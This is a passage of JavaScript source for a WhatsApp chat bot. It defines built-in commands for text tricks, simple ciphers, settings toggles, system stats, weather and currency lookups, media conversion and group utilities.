builtInCommands.vowelcount = { desc: '🔤 Count vowels', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .vowelcount <text>'), msg);
  await style.react(sock, sender, msg, '🔤');
  const t = args.join(' ').toLowerCase();
  const v = (t.match(/[aeiou]/g) || []).length;
  const c = (t.match(/[bcdfghjklmnpqrstvwxyz]/g) || []).length;
  await style.reply(sock, sender, style.box('COUNTER', `${style.kv('Vowels', v)}\n${style.kv('Consonants', c)}\n${style.kv('Total', t.length)}`), msg);
}};

builtInCommands.reversetext = { desc: '🔄 Reverse text', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .reversetext <text>'), msg);
  await style.react(sock, sender, msg, '🔄');
  await style.reply(sock, sender, style.box('REVERSED', args.join(' ').split('').reverse().join('')), msg);
}};

builtInCommands.upper = { desc: '🔠 Uppercase', execute: async (sock, sender, args, msg) => { if (!args.length) return style.reply(sock, sender, style.error('Usage: .upper <text>'), msg); await style.reply(sock, sender, args.join(' ').toUpperCase(), msg); } };
builtInCommands.lower = { desc: '🔡 Lowercase', execute: async (sock, sender, args, msg) => { if (!args.length) return style.reply(sock, sender, style.error('Usage: .lower <text>'), msg); await style.reply(sock, sender, args.join(' ').toLowerCase(), msg); } };

builtInCommands.palindrome = { desc: '🔄 Check palindrome', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .palindrome <text>'), msg);
  await style.react(sock, sender, msg, '🔄');
  const t = args.join('').toLowerCase().replace(/[^a-z0-9]/g, '');
  const isP = t === t.split('').reverse().join('');
  await style.reply(sock, sender, style.box('PALINDROME', `${isP ? '✅ YES' : '❌ NO'}\n${args.join(' ')}`), msg);
}};

builtInCommands.wordcount = { desc: '📝 Word count', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .wordcount <text>'), msg);
  await style.react(sock, sender, msg, '📝');
  const t = args.join(' ');
  await style.reply(sock, sender, style.box('WORD COUNT', `${style.kv('Words', t.split(/\s+/).filter(Boolean).length)}\n${style.kv('Characters', t.length)}\n${style.kv('Sentences', t.split(/[.!?]+/).filter(Boolean).length)}`), msg);
}};

builtInCommands.binary2 = { desc: '🔢 Binary decode', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .binary2 <binary>'), msg);
  await style.react(sock, sender, msg, '🔢');
  try {
    const text = args.join(' ').split(' ').map(b => String.fromCharCode(parseInt(b, 2))).join('');
    await style.reply(sock, sender, style.box('DECODED', text), msg);
  } catch(e) { await style.reply(sock, sender, style.error('Invalid binary.'), msg); }
}};

builtInCommands.hex = { desc: '🔢 Text to hex', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .hex <text>'), msg);
  await style.react(sock, sender, msg, '🔢');
  await style.reply(sock, sender, style.box('HEX', args.join(' ').split('').map(c => c.charCodeAt(0).toString(16)).join(' ')), msg);
}};

builtInCommands.unhex = { desc: '🔢 Hex decode', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .unhex <hex>'), msg);
  await style.react(sock, sender, msg, '🔢');
  try { const text = args.join(' ').split(' ').map(h => String.fromCharCode(parseInt(h, 16))).join(''); await style.reply(sock, sender, style.box('DECODED', text), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Invalid hex.'), msg); }
}};

builtInCommands.rot13 = { desc: '🔐 ROT13', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .rot13 <text>'), msg);
  await style.react(sock, sender, msg, '🔐');
  const r = args.join(' ').replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= 'Z' ? 90 : 122) >= c.charCodeAt(0) + 13 ? c.charCodeAt(0) + 13 : c.charCodeAt(0) - 13));
  await style.reply(sock, sender, style.box('ROT13', r), msg);
}};

builtInCommands.caesar = { desc: '🔐 Caesar cipher', execute: async (sock, sender, args, msg) => {
  if (args.length < 2) return style.reply(sock, sender, style.error('Usage: .caesar <shift> <text>'), msg);
  await style.react(sock, sender, msg, '🔐');
  const shift = parseInt(args[0]);
  const text = args.slice(1).join(' ');
  const r = text.replace(/[a-zA-Z]/g, c => String.fromCharCode((c.charCodeAt(0) - (c <= 'Z' ? 65 : 97) + shift % 26 + 26) % 26 + (c <= 'Z' ? 65 : 97)));
  await style.reply(sock, sender, style.box('CAESAR', r), msg);
}};

builtInCommands.morse = { desc: '📻 Text to Morse', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .morse <text>'), msg);
  await style.react(sock, sender, msg, '📻');
  const m = { a: '.-', b: '-...', c: '-.-.', d: '-..', e: '.', f: '..-.', g: '--.', h: '....', i: '..', j: '.---', k: '-.-', l: '.-..', m: '--', n: '-.', o: '---', p: '.--.', q: '--.-', r: '.-.', s: '...', t: '-', u: '..-', v: '...-', w: '.--', x: '-..-', y: '-.--', z: '--..', 0: '-----', 1: '.----', 2: '..---', 3: '...--', 4: '....-', 5: '.....', 6: '-....', 7: '--...', 8: '---..', 9: '----.' };
  const r = args.join(' ').toLowerCase().split('').map(c => m[c] || c).join(' ');
  await style.reply(sock, sender, style.box('MORSE', r), msg);
}};

builtInCommands.unmorse = { desc: '📻 Morse to text', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .unmorse <morse>'), msg);
  await style.react(sock, sender, msg, '📻');
  const m = { '.-': 'a', '-...': 'b', '-.-.': 'c', '-..': 'd', '.': 'e', '..-.': 'f', '--.': 'g', '....': 'h', '..': 'i', '.---': 'j', '-.-': 'k', '.-..': 'l', '--': 'm', '-.': 'n', '---': 'o', '.--.': 'p', '--.-': 'q', '.-.': 'r', '...': 's', '-': 't', '..-': 'u', '...-': 'v', '.--': 'w', '-..-': 'x', '-.--': 'y', '--..': 'z' };
  const r = args.join(' ').split(' ').map(c => m[c] || c).join('');
  await style.reply(sock, sender, style.box('DECODED', r), msg);
}};

builtInCommands.flip = { desc: '🪙 Flip text', execute: async (sock, sender, args, msg) => { if (!args.length) return style.reply(sock, sender, style.error('Usage: .flip <text>'), msg); await style.reply(sock, sender, args.join(' ').split('').reverse().join(''), msg); } };

builtInCommands.slowmode = { desc: '🐢 Slow mode toggle', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🐢');
  const rt = getRuntime(sock);
  rt.settings.slowmode = !rt.settings.slowmode; saveRuntime(sock);
  await style.reply(sock, sender, style.success(`Slowmode: ${rt.settings.slowmode ? 'ON' : 'OFF'}`), msg);
}};

builtInCommands.fastmode = { desc: '⚡ Fast mode toggle', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '⚡');
  const rt = getRuntime(sock);
  rt.settings.fastmode = !rt.settings.fastmode; saveRuntime(sock);
  await style.reply(sock, sender, style.success(`Fastmode: ${rt.settings.fastmode ? 'ON' : 'OFF'}`), msg);
}};

builtInCommands.voicereply = { desc: '🔊 Voice reply toggle', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🔊');
  const rt = getRuntime(sock);
  rt.settings.voicereply = !rt.settings.voicereply; saveRuntime(sock);
  await style.reply(sock, sender, style.success(`Voice reply: ${rt.settings.voicereply ? 'ON' : 'OFF'}`), msg);
}};

builtInCommands.autoread = { desc: '📖 Auto read toggle', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '📖');
  const rt = getRuntime(sock);
  rt.settings.autoread = !rt.settings.autoread; saveRuntime(sock);
  await style.reply(sock, sender, style.success(`Auto read: ${rt.settings.autoread ? 'ON' : 'OFF'}`), msg);
}};

builtInCommands.autoreadstatus = { desc: '👁️ Auto read status', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '👁️');
  const rt = getRuntime(sock);
  rt.settings.autoreadstatus = !rt.settings.autoreadstatus; saveRuntime(sock);
  await style.reply(sock, sender, style.success(`Auto read status: ${rt.settings.autoreadstatus ? 'ON' : 'OFF'}`), msg);
}};

builtInCommands.antionline = { desc: '📡 Anti-online', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '📡');
  const rt = getRuntime(sock);
  rt.settings.antionline = !rt.settings.antionline; saveRuntime(sock);
  await style.reply(sock, sender, style.success(`Anti-online: ${rt.settings.antionline ? 'ON' : 'OFF'}`), msg);
}};

builtInCommands.antiupdate = { desc: '🔔 Anti-update', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🔔');
  const rt = getRuntime(sock);
  rt.settings.antiupdate = !rt.settings.antiupdate; saveRuntime(sock);
  await style.reply(sock, sender, style.success(`Anti-update: ${rt.settings.antiupdate ? 'ON' : 'OFF'}`), msg);
}};

builtInCommands.onlyadmin = { desc: '🔒 Only admin toggle', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🔒');
  const rt = getRuntime(sock);
  rt.settings.onlyadmin = !rt.settings.onlyadmin; saveRuntime(sock);
  await style.reply(sock, sender, style.success(`Only admin: ${rt.settings.onlyadmin ? 'ON' : 'OFF'}`), msg);
}};

builtInCommands.silent = { desc: '🤫 Silent mode', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🤫');
  const rt = getRuntime(sock);
  rt.settings.silent = !rt.settings.silent; saveRuntime(sock);
  await style.reply(sock, sender, style.success(`Silent: ${rt.settings.silent ? 'ON' : 'OFF'}`), msg);
}};

builtInCommands.dnd = { desc: '🌙 Do not disturb', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🌙');
  const rt = getRuntime(sock);
  rt.settings.dnd = !rt.settings.dnd; saveRuntime(sock);
  await style.reply(sock, sender, style.success(`DND: ${rt.settings.dnd ? 'ON' : 'OFF'}`), msg);
}};

builtInCommands.away = { desc: '🚶 Away mode', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🚶');
  const rt = getRuntime(sock);
  rt.settings.away = args.join(' ') || 'I am away.'; saveRuntime(sock);
  await style.reply(sock, sender, style.success(`Away: ${rt.settings.away}`), msg);
}};

builtInCommands.back = { desc: '🏠 Back from away', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🏠');
  const rt = getRuntime(sock);
  rt.settings.away = null; saveRuntime(sock);
  await style.reply(sock, sender, style.success('Welcome back!'), msg);
}};

builtInCommands.boost = { desc: '🚀 Boost performance', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🚀');
  if (global.gc) global.gc();
  messageCache.clear();
  spamTracker.clear();
  await style.reply(sock, sender, style.success('Boosted! Caches cleared.'), msg);
}};

builtInCommands.memory = { desc: '💾 Memory info', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '💾');
  const used = process.memoryUsage();
  await style.reply(sock, sender, style.box('MEMORY', `${style.kv('RSS', (used.rss / 1024 / 1024).toFixed(2) + ' MB')}\n${style.kv('Heap Used', (used.heapUsed / 1024 / 1024).toFixed(2) + ' MB')}\n${style.kv('Heap Total', (used.heapTotal / 1024 / 1024).toFixed(2) + ' MB')}\n${style.kv('External', (used.external / 1024 / 1024).toFixed(2) + ' MB')}`), msg);
}};

builtInCommands.cpu = { desc: '🖥️ CPU info', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🖥️');
  const cpus = os.cpus();
  await style.reply(sock, sender, style.box('CPU', `${style.kv('Model', cpus[0]?.model)}\n${style.kv('Cores', cpus.length)}\n${style.kv('Arch', os.arch())}\n${style.kv('Load', os.loadavg().map(l => l.toFixed(2)).join(' / '))}`), msg);
}};

builtInCommands.disk = { desc: '💿 Disk info', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '💿');
  try { const { stdout } = await execAsync('df -h /', { timeout: 5000 }); await style.reply(sock, sender, style.box('DISK', stdout.trim()), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.temp = { desc: '🌡️ Temperature', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🌡️');
  try { const r = await axios.get('https://wttr.in/?format=j1', { timeout: 10000, headers: { 'User-Agent': 'curl/7.64.1' } }); const c = r.data.current_condition[0]; await style.reply(sock, sender, style.box('TEMPERATURE', `${c.temp_C}°C (${c.temp_F}°F)`), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.wind = { desc: '💨 Wind info', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '💨');
  try { const r = await axios.get('https://wttr.in/?format=j1', { timeout: 10000, headers: { 'User-Agent': 'curl/7.64.1' } }); const c = r.data.current_condition[0]; await style.reply(sock, sender, style.box('WIND', `${c.windspeedKmph} km/h ${c.winddir16Point}`), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.humidity = { desc: '💧 Humidity', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '💧');
  try { const r = await axios.get('https://wttr.in/?format=j1', { timeout: 10000, headers: { 'User-Agent': 'curl/7.64.1' } }); const c = r.data.current_condition[0]; await style.reply(sock, sender, style.box('HUMIDITY', `${c.humidity}%`), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.uv = { desc: '☀️ UV index', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '☀️');
  try { const r = await axios.get('https://wttr.in/?format=j1', { timeout: 10000, headers: { 'User-Agent': 'curl/7.64.1' } }); const c = r.data.current_condition[0]; await style.reply(sock, sender, style.box('UV INDEX', `${c.uvIndex}`), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.forecast = { desc: '📅 3-day forecast', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '📅');
  const city = args.join(' ') || '';
  try {
    const r = await axios.get(`https://wttr.in/${encodeURIComponent(city)}?format=j1`, { timeout: 10000, headers: { 'User-Agent': 'curl/7.64.1' } });
    let out = '';
    r.data.weather.slice(0, 3).forEach((d, i) => { out += `📅 ${d.date}\n🌡️ ${d.mintempC}°C - ${d.maxtempC}°C\n☁️ ${d.hourly[0].weatherDesc[0].value}\n\n`; });
    await style.reply(sock, sender, style.box('FORECAST', out), msg);
  } catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.currencylist = { desc: '💱 Currency list', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '💱');
  try {
    const r = await axios.get('https://api.exchangerate-api.com/v4/latest/USD', { timeout: 10000 });
    const list = Object.keys(r.data.rates).slice(0, 40).join(', ');
    await style.reply(sock, sender, style.box('CURRENCIES', list + '...'), msg);
  } catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.cryptolist = { desc: '💰 Top crypto', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '💰');
  try {
    const r = await axios.get('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=10&page=1', { timeout: 15000 });
    let out = '';
    r.data.forEach((c, i) => { out += `${i + 1}. ${c.symbol.toUpperCase()} — $${c.current_price}\n`; });
    await style.reply(sock, sender, style.box('TOP CRYPTO', out), msg);
  } catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.weatherforecast = { desc: '🌤️ Weather forecast', execute: async (sock, sender, args, msg) => {
  return builtInCommands.forecast.execute(sock, sender, args, msg);
}};

/* ═══════════════════ EXTRA COMMANDS ═══════════════════ */
builtInCommands.ascii = { desc: '🔤 ASCII banner', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .ascii <text>'), msg);
  await style.react(sock, sender, msg, '🔤');
  const t = args.join(' ').toUpperCase();
  const F = { A:'█▀█',B:'█▀▄',C:'█▀▀',D:'█▀▄',E:'█▀▀',F:'█▀▀',G:'█▀▀',H:'█ █',I:'█',J:' █',K:'█▄▀',L:'█  ',M:'█▀▄▀█',N:'█ █',O:'█▀█',P:'█▀█',Q:'█▀█',R:'█▀▄',S:'█▀▀',T:'▀█▀',U:'█ █',V:'█ █',W:'█ █ █',X:'▀▄▀',Y:'▄▀▄',Z:'▀▀█',' ':'   ' };
  let out = '';
  for (let r = 0; r < 2; r++) { let ln = ''; for (const ch of t) { const g = F[ch] || '   '; ln += (g.split(' ')[r] || '') + ' '; } out += ln + '\n'; }
  await style.reply(sock, sender, '```\n' + out + '```', msg);
}};

builtInCommands.tagadmins = { desc: '👑 Tag admins', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  await style.react(sock, sender, msg, '👑');
  const meta = await sock.groupMetadata(sender);
  const admins = meta.participants.filter(p => p.admin).map(p => p.id);
  if (!admins.length) return style.reply(sock, sender, style.error('No admins.'), msg);
  await sock.sendMessage(sender, { text: `👑 *ADMIN CALL*\n\n${args.join(' ') || 'Attention please.'}\n\n${admins.map(a => `> @${a.split('@')[0]}`).join('\n')}`, mentions: admins, contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
}};

builtInCommands.getgcicon = { desc: '🖼️ Get group icon', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  await style.react(sock, sender, msg, '🖼️');
  try { const url = await sock.profilePictureUrl(sender, 'image'); await sock.sendMessage(sender, { image: { url }, caption: '🖼️ Group icon', contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); }
  catch(e) { await style.reply(sock, sender, style.error('No icon.'), msg); }
}};

builtInCommands.togif = { desc: '🎞️ Video → GIF', execute: async (sock, sender, args, msg) => {
  const q = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
  if (!msg.message?.videoMessage && !q?.videoMessage) return style.reply(sock, sender, style.error('Reply to video.'), msg);
  await style.react(sock, sender, msg, '🎞️');
  await style.reply(sock, sender, style.wait('Converting...'), msg);
  try {
    const buf = await downloadMsg(sock, msg);
    const inP = path.join(TMP_DIR, `g_${Date.now()}.mp4`);
    const outP = path.join(TMP_DIR, `g_${Date.now()}_out.mp4`);
    fs.writeFileSync(inP, buf);
    await execAsync(`ffmpeg -y -i "${inP}" -vf "fps=10,scale=320:-1" -movflags faststart "${outP}"`, { timeout: 90000 });
    await sock.sendMessage(sender, { video: fs.readFileSync(outP), gifPlayback: true, mimetype: 'video/mp4', contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
    try { fs.unlinkSync(inP); } catch(e) {}
    try { fs.unlinkSync(outP); } catch(e) {}
  } catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.voice = { desc: '🎙️ Audio → voice note', execute: async (sock, sender, args, msg) => {
  const q = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
  if (!msg.message?.audioMessage && !q?.audioMessage) return style.reply(sock, sender, style.error('Reply to audio.'), msg);
  await style.react(sock, sender, msg, '🎙️');
  try {
    const buf = await downloadMsg(sock, msg);
    const out = await toPTT(buf, 'mp3');
    await sock.sendMessage(sender, { audio: out, mimetype: 'audio/ogg; codecs=opus', ptt: true, contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
  } catch(e) { await style.reply(sock, sender, style.error('Failed: ' + e.message), msg); }
}};

builtInCommands.resize = { desc: '🖼️ Resize image', execute: async (sock, sender, args, msg) => {
  const q = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
  if (!msg.message?.imageMessage && !q?.imageMessage) return style.reply(sock, sender, style.error('Reply to image with .resize 512x512'), msg);
  if (!args[0] || !/^\d+x\d+$/.test(args[0])) return style.reply(sock, sender, style.error('Usage: .resize 512x512'), msg);
  await style.react(sock, sender, msg, '🖼️');
  const [w, h] = args[0].split('x').map(Number);
  try { const buf = await downloadMsg(sock, msg); const out = await sharp(buf).resize(w, h).toBuffer(); await sock.sendMessage(sender, { image: out, caption: `🖼️ Resized to ${w}x${h}`, contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.rotate = { desc: '🔄 Rotate image', execute: async (sock, sender, args, msg) => {
  const q = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
  if (!msg.message?.imageMessage && !q?.imageMessage) return style.reply(sock, sender, style.error('Reply to image with .rotate 90'), msg);
  await style.react(sock, sender, msg, '🔄');
  const deg = parseInt(args[0]) || 90;
  try { const buf = await downloadMsg(sock, msg); const out = await sharp(buf).rotate(deg).toBuffer(); await sock.sendMessage(sender, { image: out, caption: `🔄 Rotated ${deg}°`, contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.binlookup = { desc: '💳 BIN lookup', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .binlookup <6-digit BIN>'), msg);
  await style.react(sock, sender, msg, '💳');
  try {
    const r = await axios.get(`https://lookup.binlist.net/${args[0]}`, { headers: { 'Accept-Version': '3' }, timeout: 10000 });
    const d = r.data;
    await style.reply(sock, sender, style.box('💳 BIN', `${style.kv('Scheme', d.scheme)}\n${style.kv('Type', d.type)}\n${style.kv('Brand', d.brand)}\n${style.kv('Bank', d.bank?.name || '?')}\n${style.kv('Country', d.country?.name || '?')}`), msg);
  } catch(e) { await style.reply(sock, sender, style.error('Lookup failed.'), msg); }
}};

builtInCommands.ifsc = { desc: '🏦 IFSC lookup', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .ifsc <IFSC code>'), msg);
  await style.react(sock, sender, msg, '🏦');
  try {
    const r = await axios.get(`https://ifsc.razorpay.com/${args[0].toUpperCase()}`, { timeout: 10000 });
    const d = r.data;
    await style.reply(sock, sender, style.box('🏦 IFSC', `${style.kv('Bank', d.BANK)}\n${style.kv('Branch', d.BRANCH)}\n${style.kv('City', d.CITY)}\n${style.kv('State', d.STATE)}\n${style.kv('Address', d.ADDRESS)}`), msg);
  } catch(e) { await style.reply(sock, sender, style.error('Invalid IFSC.'), msg); }
}};

builtInCommands.pincode = { desc: '📮 Postal code lookup', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .pincode <code>'), msg);
  await style.react(sock, sender, msg, '📮');
  try {
    const r = await axios.get(`https://api.zippopotam.us/in/${args[0]}`, { timeout: 10000 });
    const p = r.data.places?.[0];
    await style.reply(sock, sender, style.box('📮 PINCODE', `${style.kv('Code', r.data['post code'])}\n${style.kv('Place', p?.['place name'] || '?')}\n${style.kv('State', p?.state || '?')}`), msg);
  } catch(e) { await style.reply(sock, sender, style.error('Not found.'), msg); }
}};

builtInCommands.emailvalid = { desc: '📧 Email validator', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .emailvalid <email>'), msg);
  await style.react(sock, sender, msg, '📧');
  const ok = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(args[0]);
  await style.reply(sock, sender, style.box('📧 EMAIL', `${args[0]}\n${ok ? '✅ Valid format' : '❌ Invalid format'}`), msg);
}};

builtInCommands.phoneinfo = { desc: '📱 Phone info', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .phoneinfo <number with country code>'), msg);
  await style.react(sock, sender, msg, '📱');
  const num = args[0].replace(/[^0-9]/g, '');
  const cc = num.slice(0, num.length > 10 ? num.length - 10 : 1);
  await style.reply(sock, sender, style.box('📱 PHONE', `${style.kv('Number', '+' + num)}\n${style.kv('Length', num.length)}\n${style.kv('Country code', '+' + cc)}\n${style.kv('Format', 'International')}`), msg);
}};

builtInCommands.urlexpand = { desc: '🔗 Expand short URL', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .urlexpand <short url>'), msg);
  await style.react(sock, sender, msg, '🔗');
  try { const r = await axios.get(args[0], { maxRedirects: 5, timeout: 10000, validateStatus: () => true }); const final = r.request?.res?.responseUrl || args[0]; await style.reply(sock, sender, style.box('🔗 EXPANDED', final), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.fakeuser = { desc: '👤 Fake user', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '👤');
  try {
    const r = await axios.get('https://randomuser.me/api/', { timeout: 10000 });
    const u = r.data.results[0];
    const cap = `${style.kv('Name', `${u.name.first} ${u.name.last}`)}\n${style.kv('Gender', u.gender)}\n${style.kv('Email', u.email)}\n${style.kv('Phone', u.phone)}\n${style.kv('Country', u.location.country)}\n${style.kv('City', u.location.city)}`;
    await sock.sendMessage(sender, { image: { url: u.picture.large }, caption: `👤 *FAKE USER*\n${cap}`, contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
  } catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.tvshow = { desc: '📺 TV show info', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .tvshow <name>'), msg);
  await style.react(sock, sender, msg, '📺');
  try {
    const r = await axios.get(`https://api.tvmaze.com/search/shows?q=${encodeURIComponent(args.join(' '))}`, { timeout: 12000 });
    const s = r.data[0]?.show;
    if (!s) return style.reply(sock, sender, style.error('Not found.'), msg);
    const cap = `📺 *${s.name}*\n⭐ ${s.rating?.average || '?'}\n📅 ${s.premiered || '?'}\n🌐 ${s.network?.name || s.webChannel?.name || '?'}\n\n_${(s.summary || '').replace(/<[^>]+>/g, '').substring(0, 400)}..._`;
    if (s.image?.medium) await sock.sendMessage(sender, { image: { url: s.image.medium }, caption: cap, contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
    else await style.reply(sock, sender, cap, msg);
  } catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.tweet = { desc: '🐦 Fake tweet', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .tweet <text>'), msg);
  await style.react(sock, sender, msg, '🐦');
  const text = args.join(' ');
  const cap = `╭━━━『 🐦 TWEET 』━━━╮\n│\n│  ${text.replace(/\n/g, '\n│  ')}\n│\n╰━━━━━━━━━ ☉\n\n  💬 0   🔁 0   ❤️ 0\n  — @${OWNER_NAME.replace(/\s+/g, '')}`;
  await style.reply(sock, sender, cap, msg);
}};

builtInCommands.typing = { desc: '⌨️ Typing animation', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .typing <text>'), msg);
  await style.react(sock, sender, msg, '⌨️');
  const t = args.join(' ');
  let m = await sock.sendMessage(sender, { text: '▌' }, { quoted: msg });
  for (let i = 1; i <= t.length; i++) { await delay(80); try { await sock.sendMessage(sender, { text: t.slice(0, i) + '▌', edit: m.key }); } catch(e) { break; } }
  try { await sock.sendMessage(sender, { text: t, edit: m.key }); } catch(e) {}
}};

builtInCommands.vcard = { desc: '📇 Contact card', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .vcard <number> [name]'), msg);
  await style.react(sock, sender, msg, '📇');
  const num = args[0].replace(/[^0-9]/g, '');
  const name = args.slice(1).join(' ') || 'Contact';
  await sock.sendMessage(sender, { contacts: { displayName: name, contacts: [{ vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:${name}\nTEL;type=CELL;type=VOICE;waid=${num}:+${num}\nEND:VCARD` }] } }, { quoted: msg });
}};

builtInCommands.location = { desc: '📍 Send location', execute: async (sock, sender, args, msg) => {
  if (args.length < 2) return style.reply(sock, sender, style.error('Usage: .location <lat> <long> [name]'), msg);
  await style.react(sock, sender, msg, '📍');
  const lat = parseFloat(args[0]), lon = parseFloat(args[1]);
  if (isNaN(lat) || isNaN(lon)) return style.reply(sock, sender, style.error('Invalid coords.'), msg);
  await sock.sendMessage(sender, { location: { degreesLatitude: lat, degreesLongitude: lon, name: args.slice(2).join(' ') || 'Shared location' } }, { quoted: msg });
}};

builtInCommands.grouprules = { desc: '📜 Show rules', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  await style.react(sock, sender, msg, '📜');
  const rt = getRuntime(sock);
  const rules = rt.settings.rules || 'No rules set. Use .setrules <text>';
  await style.reply(sock, sender, style.box('📜 GROUP RULES', rules), msg);
}};

builtInCommands.setrules = { desc: '📜 Set rules', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .setrules <text>'), msg);
  await style.react(sock, sender, msg, '📜');
  const rt = getRuntime(sock);
  rt.settings.rules = args.join(' '); saveRuntime(sock);
  await style.reply(sock, sender, style.success('Rules set.'), msg);
}};

builtInCommands.me = builtInCommands.whoami = { desc: '👤 User info', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '👤');
  const isGroup = sender.endsWith('@g.us');
  const target = isGroup ? (msg.key.participant || sender) : sender;
  let role = 'Member';
  if (isOwner(target)) role = '👑 Owner';
  else if (isSudoFor(sock, target)) role = '🛡️ Sudo';
  let pp = null;
  try { pp = await sock.profilePictureUrl(target, 'image'); } catch(e) {}
  const cap = `👤 *USER INFO*\n${style.kv('Number', '+' + target.split('@')[0])}\n${style.kv('JID', target)}\n${style.kv('Role', role)}\n${style.kv('Chat', sender)}`;
  if (pp) await sock.sendMessage(sender, { image: { url: pp }, caption: cap, mentions: [target], contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
